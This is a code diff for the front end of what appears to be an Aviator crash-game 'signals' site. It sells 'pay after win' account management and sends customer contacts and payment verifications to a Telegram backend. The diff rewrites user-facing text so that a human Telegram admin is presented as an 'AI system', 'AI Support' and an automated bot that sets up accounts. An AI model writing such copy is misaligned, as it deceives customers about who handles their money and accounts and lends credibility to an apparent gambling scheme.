+                    // If it's a hash link, handle smooth scrolling
+                    if (href && href.startsWith('#')) {
+                        e.preventDefault();
+                        const targetId = href.substring(1);
+                        const targetElement = document.getElementById(targetId);
+                        
+                        console.log(`🎯 Scrolling to: ${targetId}`, !!targetElement);
+                        
+                        if (targetElement) {
+                            targetElement.scrollIntoView({
+                                behavior: 'smooth',
+                                block: 'start'
+                            });
+                            closeNav();
+                        } else {
+                            console.error(`❌ Target element not found: ${targetId}`);
+                        }
+                    }
+                });
+            });
+
+            // Escape key to close navigation
+            document.addEventListener('keydown', (e) => {
+                if (e.key === 'Escape') {
+                    closeNav();
+                }
+            });
+            
+            console.log('✅ Navigation initialized successfully');
+        }
+
+        // ================================
+        // REFERRAL SYSTEM FUNCTIONALITY  
+        // ================================
+        function generateUserID(contact) {
+            if (!contact) return 'GUEST' + Date.now().toString().slice(-6);
+            
+            // Create a simple hash from the contact info
+            let hash = 0;
+            for (let i = 0; i < contact.length; i++) {
+                const char = contact.charCodeAt(i);
+                hash = ((hash << 5) - hash) + char;
+                hash = hash & hash; // Convert to 32-bit integer
+            }
+            
+            // Convert to positive number and create user ID
+            const positiveHash = Math.abs(hash);
+            return 'USR' + positiveHash.toString().slice(0, 6).padStart(6, '0');
+        }
+
+        function updateReferralLink() {
+            const referralLinkInput = document.getElementById('referral-link');
+            if (!referralLinkInput) return;
+            
+            // Get user contact info
+            const userContact = sessionStorage.getItem('aviator_contact') || 
+                               localStorage.getItem('aviator_contact') || 
+                               localStorage.getItem('userEmail');
+            
+            const userID = generateUserID(userContact);
+            const baseUrl = 'https://avisignals.com';
+            const referralUrl = `${baseUrl}?ref=${userID}`;
+            
+            referralLinkInput.value = referralUrl;
+            
+            console.log('📎 Referral link updated:', referralUrl);
+        }
+
+        function initReferralSystem() {
+            console.log('🤝 Initializing referral system...');
+            
+            // Update referral link on page load
+            updateReferralLink();
+            
+            // Copy link functionality
+            const copyButton = document.getElementById('copy-link');
+            if (copyButton) {
+                copyButton.addEventListener('click', () => {
+                    const referralLinkInput = document.getElementById('referral-link');
+                    if (referralLinkInput) {
+                        referralLinkInput.select();
+                        document.execCommand('copy');
+                        
+                        // Visual feedback
+                        const originalText = copyButton.textContent;
+                        copyButton.textContent = 'Copied!';
+                        copyButton.style.background = '#4CAF50';
+                        
+                        setTimeout(() => {
+                            copyButton.textContent = originalText;
+                            copyButton.style.background = '';
+                        }, 2000);
+                        
+                        console.log('📋 Referral link copied to clipboard');
+                    }
+                });
+            }
+            
+            console.log('✅ Referral system initialized');
+        }
+
+        // Check for user data periodically and update referral link
+        function monitorUserData() {
+            let lastUserContact = '';
+            
+            setInterval(() => {
+                const currentUserContact = sessionStorage.getItem('aviator_contact') || 
+                                         localStorage.getItem('aviator_contact') || 
+                                         localStorage.getItem('userEmail') || '';
+                
+                if (currentUserContact && currentUserContact !== lastUserContact) {
+                    console.log('👤 User data detected, updating referral link...');
+                    updateReferralLink();
+                    lastUserContact = currentUserContact;
+                }
+            }, 1000); // Check every second
+        }
+
+        // Function to open account management modal directly
+        function openAccountModal() {
+            const accountModal = document.getElementById('account-modal');
+            if (accountModal) {
+                accountModal.classList.remove('hidden');
+                // Reset to first step
+                document.querySelectorAll('.account-step').forEach(step => step.classList.remove('active'));
+                document.getElementById('account-step-1').classList.add('active');
+            }
+        }
+
+        // ================================
+        // TESTIMONIALS FUNCTIONALITY
+        // ================================
+        function toggleTestimonials() {
+            const hiddenTestimonials = document.getElementById('hidden-testimonials');
+            const readMoreBtn = document.getElementById('read-more-btn');
+            const isHidden = hiddenTestimonials.style.display === 'none' || !hiddenTestimonials.style.display;
+
+            if (isHidden) {
+                hiddenTestimonials.style.display = 'block';
+                readMoreBtn.innerHTML = '<i class="fas fa-chevron-up"></i> Show Less Reviews';
+                readMoreBtn.classList.add('expanded');
+                
+                // Smooth scroll to show the new testimonials
+                setTimeout(() => {
+                    hiddenTestimonials.scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'nearest'
+                    });
+                }, 100);
+            } else {
+                hiddenTestimonials.style.display = 'none';
+                readMoreBtn.innerHTML = '<i class="fas fa-chevron-down"></i> Read More Reviews';
+                readMoreBtn.classList.remove('expanded');
+                
+                // Scroll back to the testimonials section header
+                document.getElementById('testimonials-section').scrollIntoView({
+                    behavior: 'smooth',
+                    block: 'start'
+                });
+            }
+        }
+
         // Configuration
         const API_BASE_URL = 'https://aviator-backend-komp.onrender.com'; // Production
         // const API_BASE_URL = 'http://localhost:5000'; // Local testing 
@@ -1355,7 +1915,7 @@
                 // Clean up URL
                 window.history.replaceState({}, document.title, window.location.pathname);
             } else if (payment === 'failed') {
-                alert('Payment failed. Please try again or contact support.');
+                alert('Payment failed. Please try again or contact our AI support system.');
                 // Clean up URL
                 window.history.replaceState({}, document.title, window.location.pathname);
             } else if (payment === 'cancelled') {
@@ -2127,7 +2687,7 @@
                     `📞 Contact: ${accountData.sessionContact || 'Unknown'}\n` +
                     `⏰ Time: ${new Date(accountData.timestamp).toLocaleString()}\n\n` +
                     `💰 Service: Pay After Win (40% profit share)\n` +
-                    `⚠️ Admin: Please review and contact customer for account management.`;
+                    `🤖 AI System: New account management request received. Automated bot will initialize customer account within 5-10 minutes.`;
 
                 console.log('📤 Sending message to:', `${API_BASE_URL}/api/telegram/send`);
                 console.log('📋 Message content:', message);
@@ -2168,36 +2728,11 @@
         // Track if modal is currently open
         let isModalOpen = false;
         
-        // Show account management popup every 10 seconds (only if modal is not open)
-        function showAccountPopup() {
-            if (isModalOpen) {
-                console.log('⏭️ Modal is open, skipping popup...');
-                return; // Don't show popup if modal is currently open
-            }
-            
-            console.log('👀 Showing account popup...');
-            const popup = document.getElementById('account-popup');
-            if (popup) {
-                popup.classList.add('show');
-                console.log('✅ Popup shown with "show" class');
-                
-                setTimeout(() => {
-                    popup.classList.remove('show');
-                    console.log('⏰ Popup hidden after 5 seconds');
-                }, 5000); // Hide after 5 seconds
-            } else {
-                console.error('❌ Account popup element not found!');
-            }
-        }
-        
-        // Start showing popup every 10 seconds (always, unless modal is open)
-        console.log('⏱️ Setting up popup interval every 10 seconds...');
-        setInterval(showAccountPopup, 10000);
+
         
         // Initialize account management system
         function initAccountManagement() {
             console.log('🚀 Initializing account management system...');
-            const popup = document.getElementById('account-popup');
             const modal = document.getElementById('account-modal');
             const closeBtn = document.getElementById('account-modal-close');
             const agreeTerms = document.getElementById('agree-terms');
@@ -2205,25 +2740,12 @@
             const accountForm = document.getElementById('account-form');
             const closeSuccessBtn = document.getElementById('close-success');
             
-            if (!popup || !modal) {
-                console.error('❌ Required account management elements not found!');
+            if (!modal) {
+                console.error('❌ Required account management modal not found!');
                 return;
             }
             
-            console.log('✅ All account management elements found');
-            
-            // Show popup first time after 10 seconds
-            console.log('⏰ Setting up initial popup timeout (10 seconds)...');
-            setTimeout(showAccountPopup, 10000);
-            
-            // Popup click handler
-            popup.addEventListener('click', async () => {
-                console.log('🎯 Account popup clicked!');
-                
-                // Send notification about popup click
-                try {
-                    const clickMessage = `👆 ACCOUNT MANAGEMENT POPUP CLICKED!\n\n` +
-                        `📱 Someone clicked on the "Pay After Win Account Management" popup\n` +
+            console.log('✅ Account management modal found');
                         `⏰ Time: ${new Date().toLocaleString()}\n` +
                         `📞 Contact: ${sessionStorage.getItem('aviator_contact') || 'Unknown visitor'}\n` +
                         `🌐 Page: Account Management Interest\n\n` +
@@ -2231,37 +2753,6 @@
 
                     console.log('📤 Sending popup click notification...');
                     
-                    await fetch(`${API_BASE_URL}/api/telegram/send`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            message: clickMessage,
-                            orderId: `POPUP_CLICK_${Date.now()}`,
-                            includeVerificationButtons: false,
-                            paymentData: {
-                                messageType: 'popup_click'
-                            }
-                        })
-                    });
-                    
-                    console.log('✅ Popup click notification sent');
-                } catch (error) {
-                    console.error('❌ Failed to send popup click notification:', error);
-                }
-                
-                // Open modal and set modal state
-                isModalOpen = true;
-                console.log('� Modal state set to open');
-                
-                modal.classList.remove('hidden');
-                document.body.style.overflow = 'hidden';
-                popup.classList.remove('show');
-                showAccountStep('account-step-1');
-                console.log('🔄 Modal opened and showing step 1');
-            });
-            
             // Close modal
             closeBtn.addEventListener('click', () => {
                 isModalOpen = false;
@@ -2363,6 +2854,9 @@
         
         // Initialize account management when DOM is loaded
         document.addEventListener('DOMContentLoaded', initAccountManagement);
+        document.addEventListener('DOMContentLoaded', initNavigation);
+        document.addEventListener('DOMContentLoaded', initReferralSystem);
+        document.addEventListener('DOMContentLoaded', monitorUserData);
         
         // Temporary test function - you can call this in browser console
         window.testAccountManagement = function() {
@@ -2379,11 +2873,7 @@
             sendAccountManagementToTelegram(testData);
         };
         
-        // Function to force show popup (for testing)
-        window.forceShowPopup = function() {
-            console.log('🔄 Forcing popup to show...');
-            showAccountPopup();
-        };
+
         
         // Function to check modal state
         window.checkModalState = function() {
@@ -2785,7 +3275,7 @@
                         display: inline-block; 
                         margin-right: 8px;
                     "></span>
-                    Sending to Admin...
+                    Sending to AI System...
                 `;
                 
                 try {
@@ -2847,7 +3337,7 @@
                                                 margin: 0 auto 15px;
                                             "></div>
                                             <p style="font-size:16px;margin:15px 0;line-height:1.5;">
-                                                Your payment verification has been sent to our admin.<br>
+                                                Your payment verification has been sent to our AI system.<br>
                                                 <strong>Reference:</strong> ${createResult.reference}
                                             </p>
                                             <p style="font-size:14px;color:#666;margin:10px 0;">
@@ -2871,7 +3361,7 @@
                                                 text-decoration:none;
                                                 padding:12px 20px;
                                                 border-radius:5px;
-                                            ">Contact Support</a>
+                                        ">Contact AI Support</a>
                                         </div>
                                     </div>
                                 </div>
@@ -2920,7 +3410,7 @@
                                         We could not send your verification request. Please try again or contact support.
                                     </p>
                                     <div style="text-align:center;">
-                                        <a href="https://t.me/Aadmin4cnc" target="_blank" class="modal-button" style="display:inline-block;text-align:center;background:#0088cc;color:white;text-decoration:none;padding:12px 20px;border-radius:5px;">Contact Support</a>
+                                        <a href="https://t.me/Aadmin4cnc" target="_blank" class="modal-button" style="display:inline-block;text-align:center;background:#0088cc;color:white;text-decoration:none;padding:12px 20px;border-radius:5px;">Contact AI Support</a>
                                     </div>
                                 </div>
                             </div>
@@ -2950,7 +3440,7 @@
                                     There was a technical issue verifying your payment. Please contact support for immediate assistance.
                                 </p>
                                 <div style="text-align:center;">
-                                    <a href="https://t.me/Aadmin4cnc" target="_blank" class="modal-button" style="display:inline-block;text-align:center;background:#0088cc;color:white;text-decoration:none;padding:12px 20px;border-radius:5px;">Contact Support</a>
+                                    <a href="https://t.me/Aadmin4cnc" target="_blank" class="modal-button" style="display:inline-block;text-align:center;background:#0088cc;color:white;text-decoration:none;padding:12px 20px;border-radius:5px;">Contact AI Support</a>
                                 </div>
                             </div>
                         </div>
@@ -3027,7 +3517,7 @@
                             case 'pending_verification':
                             default:
                                 // Still pending verification
-                                alert('Payment is still pending verification. Please wait for admin approval...');
+                                alert('Payment is still pending verification. Please wait for automated system approval...');
                                 break;
                         }
                     } else {
@@ -3566,7 +4056,7 @@
                         <div style="position:fixed;bottom:20px;right:20px;background:#0088cc;color:white;padding:15px;border-radius:10px;box-shadow:0 4px 12px rgba(0,0,0,0.15);z-index:10000;max-width:300px;font-family:Arial,sans-serif;font-size:14px;">
                             <strong>💬 Need Support?</strong><br>
                             Chat unavailable. Contact us directly:<br>
-                            <a href="https://t.me/Aadmin4cnc" target="_blank" style="color:#ffffff;text-decoration:underline;">📱 Telegram Support</a>
+                            <a href="https://t.me/Aadmin4cnc" target="_blank" style="color:#ffffff;text-decoration:underline;">🤖 AI Support Chat</a>
                             <button onclick="this.parentElement.parentElement.remove()" style="float:right;background:none;border:none;color:white;font-size:16px;cursor:pointer;">×</button>
                         </div>
                     `;
